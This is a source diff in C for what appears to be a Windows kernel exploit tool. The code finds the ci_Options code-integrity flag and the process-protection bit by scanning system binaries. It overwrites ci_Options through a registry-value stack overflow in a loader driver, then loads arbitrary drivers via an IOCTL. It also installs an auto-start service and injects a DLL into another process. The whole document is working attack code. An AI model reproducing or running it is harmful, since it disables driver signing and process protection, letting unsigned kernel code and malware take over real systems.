@@ -5,8 +5,7 @@
 
 #include "defs.h"
 #include "ntcruft.h"
-
-#include "ioctl.c"
+#include "wind.h"
 
 static void *get_res(int id, int *len)
 {
@@ -88,17 +87,49 @@ static ULONG_PTR guess_ci()
 }
 #endif
 
-static ULONG_PTR ci_analyze(void *mods, ULONG_PTR *cisave, ULONG_PTR *key)
+static int k_analyze(wind_config_t *cfg)
+{
+	HMODULE k = LoadLibraryEx(L"NTOSKRNL.EXE",NULL,DONT_RESOLVE_DLL_REFERENCES);
+	BYTE *p = (void*)GetProcAddress(k, "PsGetProcessProtection");
+	cfg->protbit = -1;
+	cfg->protofs = 0;
+	if (!p) {
+		cfg->protbit = 11;
+		p = (void*)GetProcAddress(k, "PsIsProtectedProcess");
+		// mov 
+		for (int i = 0; i < 64; i++, p++)
+			// mov eax, [anything + OFFSET]; shr eax, 11
+			if (!memcmp(p+2, "\x00\x00\xc1\xe8\x0b",5))
+				goto protfound;
+	} else {
+		// mov al, [anything+OFFSET]
+		for (int i =0 ; i < 64; i++, p++)
+			if ((p[-2] == 0x8a) && (!p[2] && !p[3]))
+				goto protfound;
+	}
+	DBG("failed to find protbit");
+	FreeLibrary(k);
+	return 0;
+protfound:;
+	cfg->protofs = *((ULONG*)(p+2));
+	FreeLibrary(k);
+	return 1;
+}
+
+static ULONG_PTR ci_analyze(void *mods, wind_config_t *cfg)
 {
 	HMODULE ci = LoadLibraryEx(L"CI.dll",NULL,DONT_RESOLVE_DLL_REFERENCES);
 	BYTE *p = (void*)GetProcAddress(ci, "CiInitialize");
 	ULONG_PTR mod = (ULONG_PTR)ci;
-	ULONG_PTR ret, base = get_mod_base(mods, "CI.DLL");
+	ULONG_PTR base = get_mod_base(mods, "CI.DLL");
+	ULONG_PTR ci_opt = 0;
+	ULONG_PTR key = 0;
 #if _WIN64
 	MEMORY_BASIC_INFORMATION info;
 #endif
 
-	if (!p) return 0;
+	if (!p)
+		goto out_free;
 	DBG("analyzing ci, modbase=%p, userbase=%p",(void*)base, (void*)mod);
 
 	// find jmp CipInitialize
@@ -116,7 +147,7 @@ static ULONG_PTR ci_analyze(void *mods, ULONG_PTR *cisave, ULONG_PTR *key)
 #endif
 	}
 	DBG("CipInitialize not found in vicinity");
-	return 0;
+	goto out_free;
 cipinit_found:
 	DBG("CipRef @ %p", p);
 	p = p + 4 + *((DWORD*)p);
@@ -126,7 +157,7 @@ cipinit_found:
 #ifdef _WIN64
 		// mov ci_Options, ecx; check the relip points back and close
 		if (p[-2] == 0x89 && p[-1] == 0x0d && p[3] == 0xff) {
-			ret = (ULONG_PTR)(p + 4) + *((LONG*)p);
+			ci_opt = (ULONG_PTR)(p + 4) + *((LONG*)p);
 			goto found_ci;
 		}
 #else
@@ -136,33 +167,32 @@ cipinit_found:
 			DWORD dw = *((DWORD*)p);
 			DBG("found mov [%x], ecx", (unsigned)dw);
 			if (dw > mod && dw < (mod+1024*1024)) {
-				ret = *(ULONG_PTR*)p;
+				ci_opt = *(ULONG_PTR*)p;
 				goto found_ci;
 			}
 		}
 #endif
 	}
 	DBG("ci_Options not found");
-	return 0;
+	goto out_free;
 found_ci:
 #if _WIN64
 	// Scratch space we use to stash original ci_Options into
-	if (!VirtualQuery((void*)ret, &info, sizeof(info)))
-		return 0;
-	DBG("data region %p-%p(%p-%p)",info.BaseAddress,info.BaseAddress+info.RegionSize,
-	info.BaseAddress-mod,info.BaseAddress+info.RegionSize-mod);
-	*cisave = (ULONG_PTR)((info.BaseAddress + info.RegionSize - 4) - mod + base);
+	if (!VirtualQuery((void*)ci_opt, &info, sizeof(info)))
+		goto out_free;
+	cfg->ci_orig = ((info.BaseAddress + info.RegionSize - 4) - mod + base);
 	// Some dummy, unknown key
 	p = (void*)mod + 4096;
 	while (*((UINT32*)p)>0xff) p++;
-	*key = (ULONG_PTR)p - mod + base;
+	key = (ULONG_PTR)p - mod + base;
 #else
-	*cisave = guess_ci();
+	cfg->ci_guess = guess_ci();
+	key = 1;
 #endif
-	ret = ret - mod + base;
-	DBG("done, ci=%p(%p) cisave=%p(%p) key=%p(%p)",
-	(void*)ret,(void*)ret-base,(void*)*cisave,(void*)*cisave-base,(void*)*key,(void*)*key-base);
-	return ret;
+	cfg->ci_opt = (void*)(ci_opt - mod + base);
+out_free:
+	FreeLibrary(ci);
+	return key;
 }
 
 static int nt_path(WCHAR *dst, WCHAR *src)
@@ -316,9 +346,12 @@ static int install_files(WCHAR *svc, WCHAR *ldr)
 
 static HANDLE trigger_loader(WCHAR *svc, WCHAR *ldr)
 {
-        ULONG_PTR cisave = 0, key = 0;
+	wind_config_t cfg = {0};
+	NTSTATUS status;
+	UNICODE_STRING svcu, ldru;
+	HANDLE dev = NULL;
         void *mod = get_mod_info();
-	ULONG_PTR ci = ci_analyze(mod, &cisave, &key);
+	ULONG_PTR key = ci_analyze(mod, &cfg);
 
 #ifdef _WIN64
 	struct {
@@ -329,15 +362,15 @@ static HANDLE trigger_loader(WCHAR *svc, WCHAR *ldr)
 	{ // save original ci_Options byte to cisave
 		.Flags = 32, // DIRECT
 		.Name = (void*)key, // valid string, but non-existent key
-		.EntryContext = (void*)cisave, // destination
+		.EntryContext = (void*)cfg.ci_orig, // destination
 		.DefaultType = REG_DWORD,
-		.DefaultData = (void*)ci, // source
+		.DefaultData = (void*)cfg.ci_opt, // source
 		.DefaultLength = 1 // save 1 byte
 	},
 	{ // overwrite ci_Options byte with 0
 		.Flags = 32, // DIRECT
 		.Name = (void*)key, // valid string, but non-existent key
-		.EntryContext = (void*)ci, // data to overwrite
+		.EntryContext = (void*)cfg.ci_opt, // data to overwrite
 		.DefaultType = REG_DWORD,
 		.DefaultData = (void*)key + 2, // source - 4 zeros
 		.DefaultLength = 1 // overwrite 1 byte
@@ -345,21 +378,19 @@ static HANDLE trigger_loader(WCHAR *svc, WCHAR *ldr)
 }};
 	RtlWriteRegistryValue(0, ldr, L"FlowControlDisable", REG_SZ, L"x", 4);
 #else
+	DWORD zero = 0;
 	// smash 4 stack DWORD entries
 	RtlWriteRegistryValue(0, ldr, L"FlowControlDisable", REG_MULTI_SZ, L"x\0x\0", 10);
 	// target addr
-	RtlWriteRegistryValue(0, ldr, L"FlowControlDisplayBandwidth", REG_DWORD, &ci, 4);
+	RtlWriteRegistryValue(0, ldr, L"FlowControlDisplayBandwidth", REG_DWORD, &cfg.ci_opt, 4);
 	// and write 0 byte there
-	DWORD zero = 0;
 	RtlWriteRegistryValue(0, ldr, L"FlowControlChannelBandwidth", REG_SZ, &zero, 1);
-
 #endif
-	NTSTATUS status;
-	HANDLE dev;
-	UNICODE_STRING svcu, ldru;
+	if (!key)
+		goto out;
 
-        if (!ci)
-		return 0;
+	k_analyze(&cfg);
+	RtlWriteRegistryValue(0, svc, L"cfg", REG_BINARY, &cfg, sizeof(cfg));
 
 	RtlInitUnicodeString(&svcu, svc);
 	RtlInitUnicodeString(&ldru, ldr);
@@ -369,15 +400,9 @@ static HANDLE trigger_loader(WCHAR *svc, WCHAR *ldr)
 		status = NtLoadDriver(&svcu);
 		(void)status;
 		DBG("NtLoadDriver(%S) = %08x", svcu.Buffer, (unsigned)status);
-		dev = ioctl_open();
+		dev = wind_open();
 		DBG("devopen=%p",dev);
-		// if that succeeds, fine
-		if (dev) {
-			DBG("doing setup");
-			// we're in, quick, restore context
-			ioctl_setup(dev, ci, cisave);
-		}
-		// remove loader, if nay
+		// remove loader, if still there
 		status = NtUnloadDriver(&ldru);
 		DBG("NtUnloadDriver(%S) = %08x", ldru.Buffer, (unsigned)status);
 		// exit if we're in
@@ -387,7 +412,7 @@ static HANDLE trigger_loader(WCHAR *svc, WCHAR *ldr)
 			break;
 #ifdef _WIN64
 		// on win64, there are 2 stack align variants, depending
-		// if REG_BINARY is negative or not.
+		// if REG_BINARY stack field lengths are negative or not.
 		if (i&1) {
 			RtlWriteRegistryValue(0, ldr, L"FlowControlDisplayBandwidth",REG_BINARY,
 					((void*)buffer.tab)-4, sizeof(buffer.tab)+4);
@@ -400,13 +425,15 @@ static HANDLE trigger_loader(WCHAR *svc, WCHAR *ldr)
 		status = NtLoadDriver(&ldru);
 		DBG("NtLoadDriver(%S) = %08x", ldru.Buffer, (unsigned)status);
 	}
+out:;
+	free(mod);
 	return dev;
 }
 
 static HANDLE check_driver(int force)
 {
 	HANDLE dev;
-	dev = ioctl_open();
+	dev = wind_open();
 	if (!dev || force) {
 		HANDLE hmutex;
 		WCHAR svc[PATH_MAX], ldr[PATH_MAX];
@@ -475,7 +502,7 @@ static int load_driver(WCHAR *name)
 	wcscpy(svc, SVC_BASE);
 	wcscat(svc, name);
 havesvc:;
-	status = ioctl_insmod(dev, svc);
+	status = wind_ioctl(dev, WIND_IOCTL_INSMOD, svc, wcslen(svc)*2+2);
 	if (!NT_SUCCESS(status)) {
 		printf("Failed to load %S NTSTATUS=%08x", name, (int)status);
 		goto outclose;
@@ -483,7 +510,7 @@ havesvc:;
 	printf("%S loaded.", name);
 	ret = 1;
 outclose:;
-	ioctl_close(dev);
+	wind_close(dev);
 	return ret;
 }
 
@@ -550,11 +577,15 @@ static int do_install()
 		SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
 		path, L"Base", NULL, NULL, NULL, NULL);
 	if (!h && (GetLastError() == ERROR_SERVICE_EXISTS)) {
+		DBG("svc already exists");
 		h = OpenService(scm, L""BASENAME"inject", SERVICE_ALL_ACCESS);
 	}
 	if (h) {
 		ret = 1;
+		DBG("attempting to start service");
 		StartService(h, 0, NULL);
+	} else {
+		DBG("service open failed, %d", (int)GetLastError());
 	}
 	if (ret) {
 		printf(BASENAME " installed successfuly.\n");
@@ -685,6 +716,7 @@ static void inject_parent(int pid)
 	char path[PATH_MAX];
 	HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
 	void *lla, *dst;
+	DBG("opened pid=%d handle=%p err=%d",pid,hp,(int)GetLastError());
 	dst = VirtualAllocEx(hp, NULL, 4096, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
 
 	strcpy(path + GetSystemDirectoryA(path,PATH_MAX), "\\" BASENAME ".dll");
@@ -692,7 +724,7 @@ static void inject_parent(int pid)
 	DBG("injecting into parent pid=%d h=%p dst=%p path=%s",(int)pid,hp,dst,path);
 
 	if (!WriteProcessMemory(hp, dst, path, strlen(path) + 1, NULL)) {
-		DBG("writing memory failed");
+		DBG("writing memory failed %d", (int)GetLastError());
 		goto out;
 	}
 
@@ -782,9 +814,13 @@ static int run_service()
 	ULONG_PTR pbi[6];
 	ULONG uls;
 
+	DBG("service launched");
+
 	StartServiceCtrlDispatcher(s_table);
 
 	load_driver(NULL);
+	DBG("sleeping");
+	Sleep(10000);
 
 	if (NT_SUCCESS(NtQueryInformationProcess(GetCurrentProcess(), 0, &pbi, sizeof(pbi), &uls)))
 		inject_parent(pbi[5]);
